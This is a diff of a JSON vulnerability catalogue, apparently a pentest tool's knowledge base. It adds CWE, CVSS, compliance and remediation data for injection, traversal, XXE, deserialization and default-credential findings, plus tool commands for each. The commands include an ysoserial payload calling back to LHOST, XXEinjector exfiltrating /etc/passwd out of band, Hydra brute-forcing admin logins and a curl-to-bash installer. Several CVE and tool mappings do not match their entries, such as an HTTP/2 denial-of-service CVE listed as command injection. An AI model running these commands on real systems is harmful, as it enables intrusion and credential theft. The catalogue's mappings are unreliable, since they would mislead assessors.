+          "url": "https://github.com/ffuf/ffuf",
+          "install": "go install github.com/ffuf/ffuf/v2@latest",
+          "command": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403",
+          "description": "Fast web fuzzer for content discovery, vhost enumeration, parameter brute-forcing"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:4917",
@@ -7083,37 +9175,125 @@
     {
       "id": "SI-128",
       "title": "OS Command Injection",
-      "aliases": [],
+      "aliases": [
+        "Shell Injection",
+        "Remote Code Execution",
+        "Remote Command Execution",
+        "Command Injection",
+        "OS Command Injection in API Parameter",
+        "OS Command Injection",
+        "RCE via Command Injection",
+        "OS Command Execution",
+        "Remote Code Execution via Code Injection"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
-      "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "cwe": [
+        "CWE-20",
+        "CWE-77",
+        "CWE-78"
+      ],
+      "cve_examples": [
+        "CVE-2021-41773",
+        "CVE-2022-24847",
+        "CVE-2022-26134",
+        "CVE-2023-44487"
+      ],
+      "cvss_v3_base": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "nessus_plugin_ids": [
+        10676,
+        153953
+      ],
+      "qualys_qids": [
+        150050,
+        150051
+      ],
+      "owasp_web": "A03:2021 \u2013 Injection",
+      "owasp_api": "API3:2023 \u2013 Injection",
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "CM-6",
+        "SA-11"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1",
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "command injection",
+        "rce"
+      ],
+      "metasploit_modules": [
+        "exploit/multi/http/apache_mod_cgi_bash_env_exec"
+      ],
+      "kev": true,
+      "remediation_brief": "Avoid passing user input to OS commands. Use safe APIs that do not invoke shells. If shell is unavoidable, validate against a strict allowlist and escape all metacharacters.",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
+      "validation_tools": [
+        {
+          "name": "commix",
+          "type": "cli",
+          "url": "https://github.com/commixproject/commix",
+          "install": "git clone https://github.com/commixproject/commix.git",
+          "command": "python3 commix.py -u 'https://TARGET/page?param=test' --level=3",
+          "description": "Automated OS command injection and exploitation tool"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        },
+        {
+          "name": "Metasploit Framework",
+          "type": "cli",
+          "url": "https://github.com/rapid7/metasploit-framework",
+          "install": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && bash msfinstall",
+          "command": "msfconsole -x 'use auxiliary/scanner/mysql/mysql_login; set RHOSTS TARGET; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; run'",
+          "description": "World's most used penetration testing framework \u2014 modules for DB auth testing, exploitation"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:5042",
@@ -7122,37 +9302,121 @@
     {
       "id": "SI-129",
       "title": "Path Traversal / Local File Inclusion",
-      "aliases": [],
+      "aliases": [
+        "File Path Traversal",
+        "Arbitrary File Read",
+        "Dot-Dot-Slash Attack",
+        "Path Traversal / Local File Inclusion in API",
+        "Local File Inclusion via Path Traversal",
+        "../ Attack",
+        "Path Traversal / Local File Inclusion",
+        "Directory Traversal"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "cwe": [
+        "CWE-22",
+        "CWE-23",
+        "CWE-35"
+      ],
+      "cve_examples": [
+        "CVE-2021-41773",
+        "CVE-2021-42013",
+        "CVE-2019-18935",
+        "CVE-2022-22719"
+      ],
+      "cvss_v3_base": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "nessus_plugin_ids": [
+        10297,
+        40984,
+        153953
+      ],
+      "qualys_qids": [
+        150060,
+        150061
+      ],
+      "owasp_web": "A01:2021 \u2013 Broken Access Control",
+      "owasp_api": "API8:2023 \u2013 Security Misconfiguration",
+      "nist_csf2": [
+        "PR.AA-05",
+        "PR.DS-02"
+      ],
+      "nist_800_53": [
+        "AC-3",
+        "SI-10"
+      ],
+      "nist_800_171": [
+        "3.1.3"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.9.4.1"
+      ],
+      "iso_27002": [
+        "9.4.1"
+      ],
+      "soc2": [
+        "CC6.3"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
-      "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "mitre_attack": [
+        {
+          "technique": "T1083",
+          "tactic": "Discovery",
+          "name": "File and Directory Discovery"
+        },
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        }
+      ],
+      "searchsploit_terms": [
+        "path traversal",
+        "directory traversal"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/apache_normalize_path"
+      ],
+      "kev": true,
+      "remediation_brief": "Canonicalize file paths and validate against an allowed base directory. Use chroot jails. Never allow user input to determine file paths directly.",
+      "remediation_component": "Application",
+      "remediation_category": "Access Control",
+      "remediation_effort": "Low",
+      "validation_tools": [
+        {
+          "name": "dotdotpwn",
+          "type": "cli",
+          "url": "https://github.com/wireghoul/dotdotpwn",
+          "install": "git clone https://github.com/wireghoul/dotdotpwn.git",
+          "command": "perl dotdotpwn.pl -m http -h TARGET -f /etc/passwd -k root -b -q",
+          "description": "Fuzzer for path traversal vulnerabilities across HTTP, FTP, and TFTP"
+        },
+        {
+          "name": "ffuf",
+          "type": "cli",
+          "url": "https://github.com/ffuf/ffuf",
+          "install": "go install github.com/ffuf/ffuf/v2@latest",
+          "command": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403",
+          "description": "Fast web fuzzer for content discovery, vhost enumeration, parameter brute-forcing"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:5100",
@@ -7161,7 +9425,21 @@
     {
       "id": "SI-130",
       "title": "SQL Injection (Error-Based)",
-      "aliases": [],
+      "aliases": [
+        "SQLi",
+        "Database Injection",
+        "Blind SQL Injection (Boolean-Based)",
+        "Blind SQL Injection",
+        "Time-Based SQL Injection",
+        "SQL Injection Confirmed by sqlmap",
+        "Second-Order SQL Injection",
+        "SQL Injection in API Parameter",
+        "SQL Error-Based Injection",
+        "SQL Injection (Error-Based) in API Parameter",
+        "SQL Injection",
+        "Union-Based SQL Injection",
+        "Blind SQL Injection (Time-Based)"
+      ],
       "source_tools": [
         "siphon"
       ],
@@ -7169,25 +9447,80 @@
       "cwe": [
         "CWE-89"
       ],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
+      "cve_examples": [
+        "CVE-2021-27101",
+        "CVE-2019-18371",
+        "CVE-2023-23752",
+        "CVE-2022-31269",
+        "CVE-2023-32315"
+      ],
+      "cvss_v3_base": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "nessus_plugin_ids": [
+        10677,
+        42424,
+        11213,
+        50393
+      ],
+      "qualys_qids": [
+        150022,
+        150023,
+        150024
+      ],
+      "owasp_web": "A03:2021 \u2013 Injection",
       "owasp_api": "API8:2023 Security Misconfiguration",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "nist_csf2": [
+        "DE.CM-01",
+        "PR.DS-02"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SA-11",
+        "RA-5"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4",
+        "6.3.2"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1",
+        "CC6.6"
+      ],
+      "hitrust": [
+        "07.a",
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "sql injection",
+        "sqlmap"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/sqli_scanner"
+      ],
       "kev": false,
       "remediation_brief": "Use parameterised queries / prepared statements for all database access; never build SQL by string concatenation of user input, and suppress database error detail in production responses.",
       "remediation_component": "Application",
@@ -7206,37 +9539,92 @@
     {
       "id": "SI-131",
       "title": "Unsafe Consumption \u2014 Open Redirect to External URL",
-      "aliases": [],
+      "aliases": [
+        "Open URL Redirect",
+        "Redirect Parameter Manipulation",
+        "Unvalidated Redirect",
+        "Unsafe Consumption \u2014 Open Redirect to External URL"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
+      "cwe": [
+        "CWE-20",
+        "CWE-601"
+      ],
       "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
+      "cvss_v3_base": 6.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
       "nessus_plugin_ids": [],
       "qualys_qids": [],
-      "owasp_web": "",
+      "owasp_web": "A01:2021 \u2013 Broken Access Control",
       "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
+      "nist_csf2": [
+        "PR.DS-02"
+      ],
+      "nist_800_53": [
+        "SI-10"
+      ],
       "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
       "hitrust": [],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "mitre_attack": [
+        {
+          "technique": "T1566.002",
+          "tactic": "Initial Access",
+          "name": "Phishing: Spearphishing Link"
+        }
+      ],
+      "searchsploit_terms": [
+        "open redirect"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/open_redirect"
+      ],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Validate redirect destinations against a server-side allowlist. Avoid using user-supplied values as redirect targets. Use indirect mapping for permitted redirect targets.",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Low",
+      "validation_tools": [
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        },
+        {
+          "name": "ffuf",
+          "type": "cli",
+          "url": "https://github.com/ffuf/ffuf",
+          "install": "go install github.com/ffuf/ffuf/v2@latest",
+          "command": "ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302,403",
+          "description": "Fast web fuzzer for content discovery, vhost enumeration, parameter brute-forcing"
+        },
+        {
+          "name": "Nikto",
+          "type": "cli",
+          "url": "https://github.com/sullo/nikto",
+          "install": "git clone https://github.com/sullo/nikto.git  OR  apt-get install nikto",
+          "command": "nikto -h https://TARGET -ssl -o nikto_report.html -Format html",
+          "description": "Web server scanner checking for dangerous files, outdated software, and misconfigurations"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:8316",
@@ -7245,37 +9633,89 @@
     {
       "id": "SI-132",
       "title": "Unsafe Consumption \u2014 Serialization Markers in API Response",
-      "aliases": [],
+      "aliases": [
+        "Unsafe Consumption \u2014 Serialization Markers in API Response",
+        "Unsafe API Consumption \u2014 Serialization Markers in Response"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
+      "cwe": [
+        "CWE-502"
+      ],
+      "cve_examples": [
+        "CVE-2015-4852",
+        "CVE-2017-5941"
+      ],
+      "cvss_v3_base": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
       "nessus_plugin_ids": [],
       "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
+      "owasp_web": "A08:2021 \u2013 Software and Data Integrity Failures",
+      "owasp_api": "API10:2023 \u2013 Unsafe Consumption of APIs",
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "SA-11"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC7.1"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
       "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
+      "mitre_attack": [
+        {
+          "technique": "T1059",
+          "tactic": "Execution",
+          "name": "Command and Scripting Interpreter"
+        }
+      ],
+      "searchsploit_terms": [
+        "java deserialization",
+        "unsafe deserialization"
+      ],
       "metasploit_modules": [],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Do not deserialize data from third-party API responses without type validation. Avoid consuming Java serialized objects or pickle streams from external sources. If serialized data must be processed, implement integrity checks, use allowlist-based deserializers, and run deserialization in sandboxed environments with restricted class loading.",
+      "remediation_component": "API",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
+      "validation_tools": [
+        {
+          "name": "ysoserial",
+          "type": "cli",
+          "url": "https://github.com/frohoff/ysoserial",
+          "install": "Download jar from https://github.com/frohoff/ysoserial/releases",
+          "command": "java -jar ysoserial.jar CommonsCollections6 'nslookup LHOST' | base64 -w 0",
+          "description": "Java deserialization payload generator for 30+ common Java library gadget chains"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:8351",
@@ -7284,37 +9724,132 @@
     {
       "id": "SI-133",
       "title": "Weak or Default Credentials Accepted",
-      "aliases": [],
+      "aliases": [
+        "Default Admin Credentials",
+        "Default Username and Password",
+        "Factory Default Login",
+        "Unchanged Default Credentials",
+        "Weak or Default Credentials Accepted",
+        "Vendor Default Password"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
-      "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "cwe": [
+        "CWE-1392"
+      ],
+      "cve_examples": [
+        "CVE-2021-40438",
+        "CVE-2020-29583",
+        "CVE-2023-20198",
+        "CVE-2021-22005"
+      ],
+      "cvss_v3_base": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "nessus_plugin_ids": [
+        10061,
+        34970,
+        57792
+      ],
+      "qualys_qids": [
+        150100,
+        150101
+      ],
+      "owasp_web": "A05:2021 \u2013 Security Misconfiguration",
+      "owasp_api": "API2:2023 \u2013 Broken Authentication",
+      "nist_csf2": [
+        "PR.AA-01",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "IA-5",
+        "CM-6"
+      ],
+      "nist_800_171": [
+        "3.5.7"
+      ],
+      "pci_dss_4": [
+        "8.3.1",
+        "2.2.1"
+      ],
+      "iso_27001": [
+        "A.9.4.3"
+      ],
+      "iso_27002": [
+        "9.4.3"
+      ],
+      "soc2": [
+        "CC6.1"
+      ],
+      "hitrust": [
+        "01.b",
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1078.001",
+          "tactic": "Initial Access",
+          "name": "Valid Accounts: Default Accounts"
+        }
+      ],
+      "searchsploit_terms": [
+        "default credentials",
+        "default password"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/default_credentials"
+      ],
+      "kev": true,
+      "remediation_brief": "Change all default credentials immediately on deployment. Enforce password change on first login. Maintain an asset inventory to track devices/services with known default credentials.",
+      "remediation_component": "Authentication",
+      "remediation_category": "Authentication",
+      "remediation_effort": "Low",
+      "validation_tools": [
+        {
+          "name": "Hydra",
+          "type": "cli",
+          "url": "https://github.com/vanhauser-thc/thc-hydra",
+          "install": "apt-get install hydra  OR  brew install hydra",
+          "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
+          "description": "Fast network logon cracker supporting 50+ protocols"
+        },
+        {
+          "name": "Medusa",
+          "type": "cli",
+          "url": "https://github.com/jmk-foofus/medusa",
+          "install": "apt-get install medusa",
+          "command": "medusa -h TARGET -u admin -P /usr/share/wordlists/rockyou.txt -M http",
+          "description": "Parallel brute-force tool supporting HTTP, SSH, FTP, MySQL, MSSQL and more"
+        },
+        {
+          "name": "CrackMapExec",
+          "type": "cli",
+          "url": "https://github.com/byt3bl33d3r/CrackMapExec",
+          "install": "pip install crackmapexec  OR  apt-get install crackmapexec",
+          "command": "crackmapexec smb TARGET -u '' -p ''\ncrackmapexec smb TARGET -u users.txt -p passwords.txt",
+          "description": "Post-exploitation framework for Active Directory, SMB, and credential testing"
+        },
+        {
+          "name": "Metasploit Framework",
+          "type": "cli",
+          "url": "https://github.com/rapid7/metasploit-framework",
+          "install": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && bash msfinstall",
+          "command": "msfconsole -x 'use auxiliary/scanner/mysql/mysql_login; set RHOSTS TARGET; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; run'",
+          "description": "World's most used penetration testing framework \u2014 modules for DB auth testing, exploitation"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:5387",
@@ -7323,37 +9858,129 @@
     {
       "id": "SI-134",
       "title": "XML External Entity (XXE) Injection",
-      "aliases": [],
+      "aliases": [
+        "XXE",
+        "XXE in API",
+        "XML Injection",
+        "XML External Entity (XXE) Injection",
+        "Blind XXE",
+        "Out-of-Band XXE",
+        "XXE File Read",
+        "XML External Entity (XXE) Injection in API"
+      ],
       "source_tools": [
         "siphon"
       ],
       "risk": "",
-      "cwe": [],
-      "cve_examples": [],
-      "cvss_v3_base": null,
-      "cvss_vector": "",
-      "nessus_plugin_ids": [],
-      "qualys_qids": [],
-      "owasp_web": "",
-      "owasp_api": "",
-      "nist_csf2": [],
-      "nist_800_53": [],
-      "nist_800_171": [],
-      "pci_dss_4": [],
-      "iso_27001": [],
-      "iso_27002": [],
-      "soc2": [],
-      "hitrust": [],
-      "gdpr": [],
-      "mitre_attack": [],
-      "searchsploit_terms": [],
-      "metasploit_modules": [],
+      "cwe": [
+        "CWE-611",
+        "CWE-827"
+      ],
+      "cve_examples": [
+        "CVE-2019-0001",
+        "CVE-2021-21985",
+        "CVE-2022-23305",
+        "CVE-2023-20022"
+      ],
+      "cvss_v3_base": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
+      "nessus_plugin_ids": [
+        108799,
+        33929
+      ],
+      "qualys_qids": [
+        150040,
+        150041
+      ],
+      "owasp_web": "A05:2021 \u2013 Security Misconfiguration",
+      "owasp_api": "API3:2023 \u2013 Injection",
+      "nist_csf2": [
+        "PR.DS-02",
+        "DE.CM-01"
+      ],
+      "nist_800_53": [
+        "SI-10",
+        "CM-6"
+      ],
+      "nist_800_171": [
+        "3.14.7"
+      ],
+      "pci_dss_4": [
+        "6.2.4"
+      ],
+      "iso_27001": [
+        "A.8.28"
+      ],
+      "iso_27002": [
+        "8.28"
+      ],
+      "soc2": [
+        "CC6.6"
+      ],
+      "hitrust": [
+        "09.ab"
+      ],
+      "gdpr": [
+        "Article 32"
+      ],
+      "mitre_attack": [
+        {
+          "technique": "T1190",
+          "tactic": "Initial Access",
+          "name": "Exploit Public-Facing Application"
+        },
+        {
+          "technique": "T1083",
+          "tactic": "Discovery",
+          "name": "File and Directory Discovery"
+        }
+      ],
+      "searchsploit_terms": [
+        "xxe",
+        "xml external entity"
+      ],
+      "metasploit_modules": [
+        "auxiliary/scanner/http/xml_injection"
+      ],
       "kev": false,
-      "remediation_brief": "",
-      "remediation_component": "",
-      "remediation_category": "",
-      "remediation_effort": "",
-      "validation_tools": [],
+      "remediation_brief": "Disable XML external entity processing in all XML parsers. Use less complex data formats such as JSON. Patch or upgrade all XML processors and libraries.",
+      "remediation_component": "Application",
+      "remediation_category": "Input Validation",
+      "remediation_effort": "Moderate",
+      "validation_tools": [
+        {
+          "name": "XXEinjector",
+          "type": "cli",
+          "url": "https://github.com/enjoiz/XXEinjector",
+          "install": "git clone https://github.com/enjoiz/XXEinjector.git",
+          "command": "ruby XXEinjector.rb --host=LHOST --path=/etc/passwd --file=request.txt --oob=http",
+          "description": "Automatic XXE injection tool with OOB and file exfiltration support"
+        },
+        {
+          "name": "SSRFmap",
+          "type": "cli",
+          "url": "https://github.com/swisskyrepo/SSRFmap",
+          "install": "git clone https://github.com/swisskyrepo/SSRFmap.git && pip3 install -r requirements.txt",
+          "command": "python3 ssrfmap.py -r request.txt -p url -m portscan",
+          "description": "Automatic SSRF exploitation tool with AWS metadata, port scanning, and internal discovery"
+        },
+        {
+          "name": "interactsh-client",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/interactsh",
+          "install": "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
+          "command": "interactsh-client  # generates OOB URL to place in SSRF parameter",
+          "description": "Out-of-band (OOB) interaction server for detecting blind SSRF, SSTI, and XXE"
+        },
+        {
+          "name": "nuclei",
+          "type": "cli",
+          "url": "https://github.com/projectdiscovery/nuclei",
+          "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+          "command": "nuclei -u TARGET -t cves/ -t vulnerabilities/ -t exposures/\nnuclei -u TARGET -tags sqli,xss,ssrf",
+          "description": "Fast template-based vulnerability scanner with 5000+ community templates"
+        }
+      ],
       "description": "",
       "impact": "",
       "_scaffold_from": "siphon.py:4985",
